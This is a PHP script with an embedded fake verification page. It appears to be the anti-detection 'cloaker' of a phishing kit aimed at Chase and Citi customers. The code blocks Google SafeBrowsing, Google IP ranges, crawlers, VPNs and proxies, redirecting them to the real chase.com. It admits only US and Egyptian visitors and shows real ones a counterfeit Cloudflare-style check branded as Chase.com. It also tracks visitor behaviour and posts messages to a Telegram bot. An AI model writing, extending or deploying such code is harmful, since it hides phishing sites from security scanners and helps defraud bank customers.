<?php

$uri = $_SERVER['REQUEST_URI'] ?? '';
$basename = basename(parse_url($uri, PHP_URL_PATH));
$is_js_fetch = isset($_SERVER['HTTP_SEC_FETCH_MODE']) && $_SERVER['HTTP_SEC_FETCH_MODE'] === 'cors';

// ✅ استثناء كامل لمكالمات fetch()
if (
    in_array($basename, ['start_session.php', 'render.php']) &&
    $is_js_fetch
) {
    return;
}

define('FP_FILE', __DIR__ . '/fingerprints.json');
define('BEHAVIOR_FILE', __DIR__ . '/behavior_tracking.json');

file_put_contents('logs/blocked.txt', $_SERVER['REMOTE_ADDR']." | ".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);

// دوال fingerprint
function load_fingerprints() {
    if (!file_exists(FP_FILE)) file_put_contents(FP_FILE, json_encode([], JSON_PRETTY_PRINT));
    return json_decode(file_get_contents(FP_FILE), true) ?: [];
}

function save_fingerprint($ip, $hash) {
    $fps = load_fingerprints();
    $fps[$ip] = $hash;
    file_put_contents(FP_FILE, json_encode($fps, JSON_PRETTY_PRINT));
}

function get_fingerprint_for_ip($ip) {
    $fps = load_fingerprints();
    return $fps[$ip] ?? null;
}

// Behavioral tracking functions
function load_behavior_data() {
    if (!file_exists(BEHAVIOR_FILE)) {
        file_put_contents(BEHAVIOR_FILE, json_encode([], JSON_PRETTY_PRINT));
    }
    return json_decode(file_get_contents(BEHAVIOR_FILE), true) ?: [];
}

function save_behavior_data($data) {
    file_put_contents(BEHAVIOR_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

function track_temporal_behavior($ip, $action, $timestamp, $data = []) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip])) {
        $behaviors[$ip] = ['sessions' => [], 'first_seen' => time()];
    }
    
    $session_id = $_COOKIE['session_id'] ?? session_id();
    if (!isset($behaviors[$ip]['sessions'][$session_id])) {
        $behaviors[$ip]['sessions'][$session_id] = ['actions' => [], 'start_time' => time()];
    }
    
    $behaviors[$ip]['sessions'][$session_id]['actions'][] = [
        'action' => $action,
        'timestamp' => $timestamp,
        'data' => $data
    ];
    
    save_behavior_data($behaviors);
    return $behaviors[$ip];
}

function analyze_temporal_patterns($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    foreach ($behaviors[$ip]['sessions'] as $session_id => $session) {
        if (empty($session['actions']) || count($session['actions']) < 3) {
            continue;
        }
        
        $timings = [];
        for ($i = 1; $i < count($session['actions']); $i++) {
            $diff = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
            $timings[] = $diff;
        }
        
        // Check for mathematically equal timings
        $timing_variance = count(array_unique($timings)) / max(count($timings), 1);
        if ($timing_variance < 0.5 && count($timings) >= 3) {
            $score += 30;
            $reasons[] = 'Equal click timings detected';
        }
        
        // Check for absence of hesitation (all actions too fast)
        $avg_timing = array_sum($timings) / max(count($timings), 1);
        if ($avg_timing < 100) { // Less than 100ms average
            $score += 25;
            $reasons[] = 'No hesitation or natural pauses';
        }
        
        // Check for constant reading times
        $reading_actions = array_filter($session['actions'], function($a) {
            return isset($a['data']['text_length']);
        });
        if (count($reading_actions) >= 2) {
            $read_times = [];
            foreach ($reading_actions as $action) {
                if (isset($action['data']['read_time'])) {
                    $read_times[] = $action['data']['read_time'];
                }
            }
            if (count($read_times) >= 2 && count(array_unique($read_times)) === 1) {
                $score += 20;
                $reasons[] = 'Constant reading times regardless of content';
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_interaction_noise($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $total_actions = 0;
    $error_count = 0;
    $canceled_count = 0;
    $efficient_count = 0;
    
    foreach ($behaviors[$ip]['sessions'] as $session) {
        foreach ($session['actions'] as $action) {
            $total_actions++;
            
            if (isset($action['data']['input_error']) && $action['data']['input_error']) {
                $error_count++;
            }
            if (isset($action['data']['canceled']) && $action['data']['canceled']) {
                $canceled_count++;
            }
            if (isset($action['data']['skipped_visual_hints']) && $action['data']['skipped_visual_hints']) {
                $efficient_count++;
            }
        }
    }
    
    // Human users make minor errors
    if ($total_actions > 10 && $error_count === 0 && $canceled_count === 0) {
        $score += 40;
        $reasons[] = 'No interaction noise (errors/cancellations)';
    }
    
    // Over-efficient interaction
    if ($total_actions > 5 && $efficient_count / $total_actions > 0.8) {
        $score += 35;
        $reasons[] = 'Overly efficient, ignoring visual hints';
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_ui_semantics($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    foreach ($behaviors[$ip]['sessions'] as $session) {
        $ignores_cosmetic = 0;
        $total_interactions = 0;
        
        foreach ($session['actions'] as $action) {
            if (isset($action['data']['element_type'])) {
                $total_interactions++;
                if (isset($action['data']['ignores_cosmetic']) && $action['data']['ignores_cosmetic']) {
                    $ignores_cosmetic++;
                }
            }
        }
        
        if ($total_interactions > 0 && $ignores_cosmetic / $total_interactions > 0.9) {
            $score += 45;
            $reasons[] = 'Ignores cosmetic/decorative elements';
        }
        
        // Check for robotic patterns unaffected by visual rearrangement
        if (isset($session['actions'][0]['data']['visual_order_changed'])) {
            $unchanged_pattern = true;
            for ($i = 1; $i < count($session['actions']); $i++) {
                if (isset($session['actions'][$i]['data']['adapted_to_order'])) {
                    $unchanged_pattern = false;
                    break;
                }
            }
            if ($unchanged_pattern && count($session['actions']) > 3) {
                $score += 40;
                $reasons[] = 'Robotic pattern, unaffected by visual changes';
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_session_continuity($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $sessions = $behaviors[$ip]['sessions'];
    
    if (count($sessions) < 2) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $navigation_patterns = [];
    foreach ($sessions as $session) {
        $nav_sequence = [];
        foreach ($session['actions'] as $action) {
            if ($action['action'] === 'navigate' && isset($action['data']['path'])) {
                $nav_sequence[] = $action['data']['path'];
            }
        }
        if (!empty($nav_sequence)) {
            $navigation_patterns[] = implode('>', $nav_sequence);
        }
    }
    
    // Check for repeated identical navigation without natural variation
    if (count($navigation_patterns) >= 2) {
        $unique_patterns = count(array_unique($navigation_patterns));
        if ($unique_patterns / count($navigation_patterns) < 0.3) {
            $score += 50;
            $reasons[] = 'Repeated identical navigation patterns';
        }
    }
    
    // Check for missing ordinary resume logic
    $session_times = array_column($sessions, 'start_time');
    sort($session_times);
    for ($i = 1; $i < count($session_times); $i++) {
        $gap = $session_times[$i] - $session_times[$i-1];
        // If sessions are suspiciously close (less than 5 seconds apart)
        if ($gap < 5) {
            $score += 30;
            $reasons[] = 'Suspicious session timing, missing resume logic';
            break;
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function calculate_bot_confidence($ip) {
    $temporal = analyze_temporal_patterns($ip);
    $noise = analyze_interaction_noise($ip);
    $semantics = analyze_ui_semantics($ip);
    $continuity = analyze_session_continuity($ip);
    
    // Weighted average of all detection domains
    $total_score = (
        $temporal['score'] * 0.3 +
        $noise['score'] * 0.25 +
        $semantics['score'] * 0.25 +
        $continuity['score'] * 0.2
    );
    
    $all_reasons = array_merge(
        $temporal['reasons'],
        $noise['reasons'],
        $semantics['reasons'],
        $continuity['reasons']
    );
    
    return [
        'confidence' => $total_score,
        'is_confident_human' => $total_score < 20,
        'is_uncertain' => $total_score >= 20 && $total_score < 60,
        'is_likely_bot' => $total_score >= 60,
        'reasons' => $all_reasons,
        'domain_scores' => [
            'temporal' => $temporal['score'],
            'noise' => $noise['score'],
            'semantics' => $semantics['score'],
            'continuity' => $continuity['score']
        ]
    ];
}
$config = require __DIR__ . '/config.php';

$LOG_FILE                   = $config['log_file'];
$BLACKLIST_THRESHOLD        = $config['blacklist_threshold'];
$PROXYCHECK_RISK_THRESHOLD  = $config['proxycheck_risk_threshold'];
$NEUTRINO_USER_ID           = $config['user_id'];
$NEUTRINO_API_KEY           = $config['api_key'];
$PROXYCHECK_KEY             = $config['proxycheck_key'];
$TG_BOT_TOKEN               = $config['tg_bot_token'];
$TG_CHAT_ID                 = $config['tg_chat_id'];

define('BLOCKED_IPS_FILE', __DIR__ . '/blocked_ips.json');

date_default_timezone_set('Africa/Cairo');

function get_whitelisted_ips() {
    return [
        '127.0.0.1',
        '156.217.174.222',
    ];
}

function load_blocked_ips() {
    if (!file_exists(BLOCKED_IPS_FILE)) {
        file_put_contents(BLOCKED_IPS_FILE, json_encode([], JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
    $content = file_get_contents(BLOCKED_IPS_FILE);
    $array   = json_decode($content, true);
    return is_array($array) ? $array : [];
}

function add_to_blocked_ips($ip) {
    $whitelist = get_whitelisted_ips();
    if (in_array($ip, $whitelist, true)) {
        return;
    }

    $blocked = load_blocked_ips();
    if (!in_array($ip, $blocked, true)) {
        $blocked[] = $ip;
        file_put_contents(BLOCKED_IPS_FILE, json_encode($blocked, JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
}

function send_telegram($text){
    global $TG_BOT_TOKEN, $TG_CHAT_ID;
    if (empty($TG_BOT_TOKEN) || empty($TG_CHAT_ID)) {
        return;
    }
    $url     = "https://api.telegram.org/bot{$TG_BOT_TOKEN}/sendMessage";
    $payload = [
        'chat_id'    => $TG_CHAT_ID,
        'parse_mode' => 'Markdown',
        'text'       => $text,
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT_MS, 500);
    curl_exec($ch);
    curl_close($ch);
}

function get_client_ip(){
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $xff = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]);
        return trim($xff[0]);
    }
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    if (!empty($_SERVER["HTTP_FORWARDED_FOR"])) {
        $fwd = explode(",", $_SERVER["HTTP_FORWARDED_FOR"]);
        return trim($fwd[0]);
    }
    if (!empty($_SERVER["HTTP_FORWARDED"])) {
        $parts = explode(";", $_SERVER["HTTP_FORWARDED"]);
        foreach ($parts as $p) {
            $p = trim($p);
            if (stripos($p, "for=") === 0) {
                return trim(substr($p, 4));
            }
        }
    }
    return $_SERVER["REMOTE_ADDR"] ?? '0.0.0.0';
}

function is_bot_request($ua){
    if (strlen($ua) < 10) {
        return true;
    }
    return preg_match(
        '/(bot|crawler|spider|crawl|bingbot|googlebot|slurp|baiduspider|yandexbot|duckduckbot|chatgpt|copilot|gptbot|uptimerobot|newrelic|statuscake|pingdom|curl|wget|python|php|httpclient|libwww-perl)/i',
        $ua
    );
}

function check_ip_reputation($ip){
    global $NEUTRINO_USER_ID, $NEUTRINO_API_KEY;
    $url = "https://neutrinoapi.net/host-reputation?" . http_build_query([
        "user-id" => $NEUTRINO_USER_ID,
        "api-key" => $NEUTRINO_API_KEY,
        "host"    => $ip
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code !== 200 || !$resp) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    $data = json_decode($resp, true);
    if (!is_array($data)) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    return [
        "risk-score" => intval($data["risk-score"] ?? 0),
        "lists"      => is_array($data["lists"]) ? $data["lists"] : [],
        "is-proxy"   => !empty($data["is-proxy"]),
        "is-vpn"     => !empty($data["is-vpn"]),
        "is-bot"     => !empty($data["is-bot"])
    ];
}

function check_proxycheck($ip){
    global $PROXYCHECK_KEY;
    $url = "https://proxycheck.io/v2/{$ip}?" . http_build_query([
        "key"  => $PROXYCHECK_KEY,
        "vpn"  => 1,
        "risk" => 1
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    curl_close($ch);
    $data = @json_decode($resp, true) ?: [];
    if (!isset($data[$ip])) {
        return ["proxy" => false, "type" => "", "risk" => 0];
    }
    return [
        "proxy" => ($data[$ip]["proxy"] ?? "") === "yes",
        "type"  => $data[$ip]["type"]  ?? "",
        "risk"  => intval($data[$ip]["risk"] ?? 0)
    ];
}

function block_and_exit($client_ip, $user_agent, $reason) {
    global $LOG_FILE;
    add_to_blocked_ips($client_ip);
    $line = date("Y-m-d H:i:s")
          . " | REDIRECTED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | Reason: {$reason}\n";
    file_put_contents($LOG_FILE, $line, FILE_APPEND);
    if (!headers_sent()) {
        header("Location: https://www.chase.com");
        exit;
    }
}

$client_ip  = get_client_ip();
$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "";

if (is_bot_from_github_list($user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Detected from GitHub Bot List');
}

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$origin  = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowed_sources = [
    'https://gotoschooleg.com',
    'https://www.gotoschooleg.com',
];
foreach ($allowed_sources as $src) {
    if (stripos($referer, $src) !== false || stripos($origin, $src) !== false) {
        return false;
    }
}

if (preg_match('/google.*safebrowsing|googleinspectiontool/i', $user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Blocked Google SafeBrowsing');
}

$google_ranges = ['64.233.', '66.102.', '66.249.', '108.177.', '209.85.', '216.239.'];
foreach ($google_ranges as $prefix) {
    if (str_starts_with($client_ip, $prefix)) {
        block_and_exit($client_ip, $user_agent, 'Blocked Google IP Range');
    }
}
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$client_ip}?fields=countryCode"), true);
$allowed_countries = ['US', 'EG'];
if (!isset($geo['countryCode']) || !in_array($geo['countryCode'], $allowed_countries)) {
    block_and_exit($client_ip, $user_agent, "Country Not Allowed: " . ($geo['countryCode'] ?? 'Unknown'));
}

$blocked_list = load_blocked_ips();
if (in_array($client_ip, $blocked_list, true)) {
    block_and_exit($client_ip, $user_agent, "Previously Blocked IP");
}

if (!file_exists($LOG_FILE)) {
    file_put_contents($LOG_FILE, "");
    @chmod($LOG_FILE, 0644);
}
file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | anitbot.php RUNNING | IP: {$client_ip}\n", FILE_APPEND);

if (empty($user_agent) || preg_match('/^(curl|wget|python|libwww-perl|httpclient|php)/i', $user_agent)) {
    $reason = empty($user_agent) ? "Empty UA" : "Suspicious UA";
    block_and_exit($client_ip, $user_agent, $reason);
}
if (is_bot_request($user_agent)) {
    $reason = "UA Bot";
    block_and_exit($client_ip, $user_agent, $reason);
}

function is_bot_from_github_list(string $ua): bool {
    static $bot_patterns = null;
    if ($bot_patterns === null) {
        $file = __DIR__ . '/crawler-user-agents.json';
        if (!file_exists($file)) return false;
        $json = file_get_contents($file);
        $data = json_decode($json, true);
        if (!is_array($data)) return false;
        $bot_patterns = array_column($data, 'pattern');
    }
    foreach ($bot_patterns as $pattern) {
        if (@preg_match("/$pattern/i", $ua)) {
            return true;
        }
    }
    return false;
}

function is_advanced_bot($ip, $ua) {
    if (isset($_COOKIE['js_verified']) && $_COOKIE['js_verified'] === 'yes') {
        return false;
    }
    if (preg_match('/HeadlessChrome|Puppeteer|Playwright/i', $ua)) {
        return 'Headless browser';
    }
    if (stripos($ua, 'Chrome') !== false && (
        empty($_SERVER['HTTP_SEC_CH_UA']) ||
        empty($_SERVER['HTTP_SEC_FETCH_SITE'])
    )) {
        return 'Fake Chrome UA';
    }
    $known_ranges = ['64.233.', '66.102.', '66.249.', '157.55.', '167.89.'];
    foreach ($known_ranges as $prefix) {
        if (str_starts_with($ip, $prefix)) {
            return 'Bot IP Range';
        }
    }
    return false;
}

$rez        = check_ip_reputation($client_ip);
$risk_score = $rez["risk-score"];
$lists      = $rez["lists"];
$is_proxy   = $rez["is-proxy"];
$is_vpn     = $rez["is-vpn"];
$is_neu_bot = $rez["is-bot"];
$listedCount = 0;
foreach ($lists as $entry) {
    if (!empty($entry["is-listed"])) {
        $listedCount++;
    }
}
$pc              = check_proxycheck($client_ip);
$proxycheckProxy = $pc["proxy"];
$proxycheckType  = $pc["type"];
$proxycheckRisk  = $pc["risk"];

if ($is_proxy || $is_vpn || ($proxycheckProxy && $proxycheckRisk >= $PROXYCHECK_RISK_THRESHOLD)) {
    $reason = "VPN/Proxy Detected";
    block_and_exit($client_ip, $user_agent, $reason);
}
if ($risk_score >= 30 || $listedCount >= $BLACKLIST_THRESHOLD) {
    $reason = "High Risk ({$risk_score}) or ListedCount ({$listedCount})";
    block_and_exit($client_ip, $user_agent, $reason);
}
$log_line = date("Y-m-d H:i:s")
          . " | ALLOWED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | NeutrinoRisk: {$risk_score}"
          . " | NeutrinoProxy: " . ($is_proxy ? "Y" : "N")
          . " | NeutrinoVPN: "   . ($is_vpn   ? "Y" : "N")
          . " | NeutrinoBot: "   . ($is_neu_bot ? "Y":"N")
          . " | ListedCount: {$listedCount}"
          . " | ProxyCheckProxy: " . ($proxycheckProxy?"Y":"N")
          . " | ProxyCheckType: {$proxycheckType}"
          . " | ProxyCheckRisk: {$proxycheckRisk}"
          . "\n";
file_put_contents($LOG_FILE, $log_line, FILE_APPEND);

// -------------------------------------------------
// CAPTCHA واجهة التحقق Cloudflare-style checkbox كبيرة على الهاتف
// Enhanced with behavioral analysis for better bot detection
// -------------------------------------------------

// Calculate bot confidence before showing CAPTCHA
$bot_analysis = calculate_bot_confidence($client_ip);
$show_warning_ui = false;

// Seamless access for confident humans
if ($bot_analysis['is_confident_human']) {
    // Set cookies to bypass CAPTCHA for confident humans
    if (!isset($_COOKIE['js_verified'])) {
        setcookie('js_verified', 'yes', time() + 86400, '/');
        setcookie('fp_hash', 'human', time() + 86400, '/');
    }
}

// Show warning UI only for uncertain cases
if ($bot_analysis['is_uncertain']) {
    $show_warning_ui = true;
}

// Block likely bots immediately
if ($bot_analysis['is_likely_bot']) {
    $reason = 'Behavioral Analysis: ' . implode(', ', $bot_analysis['reasons']);
    block_and_exit($client_ip, $user_agent, $reason);
}

if (!isset($_COOKIE['js_verified'], $_COOKIE['fp_hash']) && $show_warning_ui) {
    // احفظ الرابط الأصلي في localStorage من السيرفر للواجهة JS
    echo '<script>try { localStorage.setItem("antibot_redirect", ' . json_encode($_SERVER['REQUEST_URI']) . '); }catch(e){}</script>';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title id="dynamic-title">Verify you are human</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="icon" href="https://www.citi.com/favicon.ico" sizes="any">
  <link rel="icon" type="image/svg+xml" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
  <style>
    :root {
      --box-border:#e5e7eb;
      --box-bg:#fff;
      --text:#222;
      --muted:#8b8b8b;
      --check:#198754;
      --check-bg:#eaf7ed;
      --shadow:0 1px 6px rgba(0,0,0,.06);
    }

    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #fff;
      font-family: "Segoe UI","Tahoma","Arial",sans-serif;
      color: var(--text);
      display: flex;
      justify-content: flex-start;
      align-items: flex-start;
    }

    .wrap {
      margin: 90px 0 0 48px; /* الكمبيوتر */
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      max-width: 640px;
      width: 100%;
      box-sizing: border-box;
    }

    .head {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 6px;
    }

    .site-logo { height: 26px; width: auto; object-fit: contain; }
    .site-title { font-size: 1.8rem; font-weight: 700; margin: 0; }
    .desc { font-size: 1rem; margin: 0 0 16px 0; }

    .cf-box {
      position: relative;
      background: var(--box-bg);
      border: 1px solid var(--box-border);
      border-radius: 6px;
      box-shadow: var(--shadow);
      width: 100%;
      max-width: 560px;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
      box-sizing: border-box;
      overflow: hidden;
    }

    .cf-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
    .cf-checkbox {
      appearance: none;
      width: 24px; height: 24px;
      border: 2px solid #bfbfbf; border-radius: 6px;
      background: #f9f9f9; cursor: pointer;
      position: relative; outline: none;
      transition: border-color .18s, background .18s;
      flex: 0 0 24px;
    }
    .cf-checkbox:checked { border-color: var(--check); background: var(--check-bg); }
    .cf-checkbox:checked::after {
      content: "";
      position: absolute;
      left: 6px; top: 3px;
      width: 8px; height: 14px;
      border: solid var(--check);
      border-width: 0 3px 3px 0;
      transform: rotate(45deg);
    }

    .cf-text { font-size: .98rem; user-select: none; }
    .cf-right { display: flex; flex-direction: column; align-items: flex-end; min-width: 70px; }
    .cf-logo { height: 22px; object-fit: contain; margin-bottom: 4px; }
    .cf-legal { font-size: .88rem; color: var(--muted); }

    .state-overlay {
      position: absolute;
      inset: 0;
      background: #fff;
      display: none;
      align-items: center;
      gap: 10px;
      padding: 0 14px;
      font-size: .98rem;
      font-weight: 600;
    }

    .state-overlay.active { display: flex; animation: fade .2s; }
    .spinner {
      width: 18px; height: 18px;
      display: inline-block; position: relative;
    }
    .spinner::before {
      content: "";
      position: absolute; inset: 0;
      border-radius: 50%;
      border: 3px dotted #4a9cdb;
      animation: spin 1s linear infinite;
    }

    .success-icon {
      width: 22px; height: 22px;
      border-radius: 50%;
      background: #34c759; color: #fff;
      display: inline-flex; align-items: center;
      justify-content: center; font-size: 14px;
    }

    .foot { margin-top: 14px; font-size: .98rem; }

    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes fade { from { opacity: 0; } to { opacity: 1; } }

    /* 📱 نسخة الهاتف - نزلته تحت أكثر */
    @media (max-width: 600px) {
      .wrap {
        margin: 110px 0 0 16px; /* ← زودت المسافة العلوية فقط للهاتف */
        max-width: 100%;
        width: calc(100vw - 32px);
      }
      .site-title { font-size: 1.25rem; }
      .desc { font-size: .95rem; margin-bottom: 12px; }
      .cf-box {
        max-width: none;
        width: 100%;
        padding: 8px 12px;
      }
      .cf-text { font-size: .94rem; }
      .cf-right { min-width: auto; }
      .cf-logo { height: 20px; }
      .foot { font-size: .9rem; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="head">
      <img id="site-logo" class="site-logo" src="https://www.chase.com/etc/designs/chase-ux/favicon.ico" alt="">
      <h1 id="site-title" class="site-title">Chase.com</h1>
    </div>
    <p class="desc">Verify you are human by completing the action below.</p>

    <form id="cfForm" class="cf-box" autocomplete="off" onsubmit="return false">
      <label class="cf-left" for="cfCheck">
        <input id="cfCheck" type="checkbox" class="cf-checkbox" aria-label="Verify you are human">
        <span class="cf-text">Verify you are human</span>
      </label>
      <div class="cf-right" aria-hidden="true">
        <img class="cf-logo" src="https://api.imghippo.com/files/oh3020lFQ.png" alt="CLOUDFLARE">
        <div class="cf-legal">Privacy &nbsp;•&nbsp; Terms</div>
      </div>

      <div id="stateVerifying" class="state-overlay" aria-live="polite">
        <span class="spinner" aria-hidden="true"></span>
        <span>Verifying...</span>
      </div>

      <div id="stateSuccess" class="state-overlay" aria-live="polite">
        <span class="success-icon">✔</span>
        <span>Success!</span>
      </div>
    </form>

    <p id="site-foot" class="foot">citi.com needs to review the security of your connection before proceeding.</p>
  </div>

  <script>
    function setSite(name, logoUrl) {
      document.getElementById('site-title').textContent = name;
      document.getElementById('site-foot').textContent =
        name + " needs to review the security of your connection before proceeding.";
      document.getElementById('dynamic-title').textContent = name + " | Verify you are human";
      if (logoUrl) document.getElementById('site-logo').src = logoUrl;
    }

    setSite("Chase.com", "https://www.chase.com/etc/designs/chase-ux/favicon.ico");

    // Behavioral tracking for anti-bot detection
    const behaviorData = {
      clicks: [],
      mouseMovements: [],
      keyPresses: [],
      startTime: Date.now(),
      errors: 0,
      hesitations: 0
    };

    // Track mouse movements for natural behavior
    let lastMouseMove = Date.now();
    document.addEventListener('mousemove', (e) => {
      const now = Date.now();
      const timeSinceLastMove = now - lastMouseMove;
      behaviorData.mouseMovements.push({
        x: e.clientX,
        y: e.clientY,
        time: now,
        gap: timeSinceLastMove
      });
      lastMouseMove = now;
      
      // Keep only last 50 movements to avoid memory issues
      if (behaviorData.mouseMovements.length > 50) {
        behaviorData.mouseMovements.shift();
      }
    });

    // Track clicks with timing
    document.addEventListener('click', (e) => {
      behaviorData.clicks.push({
        x: e.clientX,
        y: e.clientY,
        time: Date.now(),
        target: e.target.tagName
      });
    });

    // Track keyboard interactions
    document.addEventListener('keydown', (e) => {
      behaviorData.keyPresses.push({
        key: e.key,
        time: Date.now()
      });
    });

    const check = document.getElementById('cfCheck');
    const vState = document.getElementById('stateVerifying');
    const sState = document.getElementById('stateSuccess');
    const originalUrl = localStorage.getItem('antibot_redirect') || '/';

    check.addEventListener('change', () => {
      if (!check.checked) {
        vState.classList.remove('active');
        sState.classList.remove('active');
        return;
      }
      
      // Calculate behavioral metrics
      const totalTime = Date.now() - behaviorData.startTime;
      const hasNaturalMovement = behaviorData.mouseMovements.length > 10;
      const hasVariedTiming = behaviorData.mouseMovements.some(m => m.gap > 50);
      const notTooFast = totalTime > 1000; // At least 1 second before clicking
      
      vState.classList.add('active');
      
      // Send behavioral data to server
      const behaviorScore = {
        totalTime,
        mouseMovements: behaviorData.mouseMovements.length,
        clicks: behaviorData.clicks.length,
        naturalBehavior: hasNaturalMovement && hasVariedTiming && notTooFast
      };
      
      // Store in localStorage for potential server-side verification
      try {
        localStorage.setItem('behavior_check', JSON.stringify(behaviorScore));
      } catch(e) {}
      
      document.cookie = "js_verified=yes; path=/";
      document.cookie = "fp_hash=human; path=/";
      document.cookie = "behavior_verified=" + (behaviorScore.naturalBehavior ? "yes" : "uncertain") + "; path=/";
      
      setTimeout(() => {
        vState.classList.remove('active');
        sState.classList.add('active');
        setTimeout(() => { location.href = originalUrl; }, 900);
      }, 800);
    });
  </script>
</body>
</html>

<?php exit; } ?>

<?php
// API endpoint for tracking behavioral data during normal browsing
if (isset($_POST['track_behavior']) && isset($_POST['behavior_data'])) {
    header('Content-Type: application/json');
    
    $behavior_data = json_decode($_POST['behavior_data'], true);
    if ($behavior_data && is_array($behavior_data)) {
        $client_ip = get_client_ip();
        $action = $behavior_data['action'] ?? 'unknown';
        $timestamp = $behavior_data['timestamp'] ?? time();
        
        track_temporal_behavior($client_ip, $action, $timestamp, $behavior_data);
        
        echo json_encode(['status' => 'success', 'tracked' => true]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
    }
    exit;
}
?>
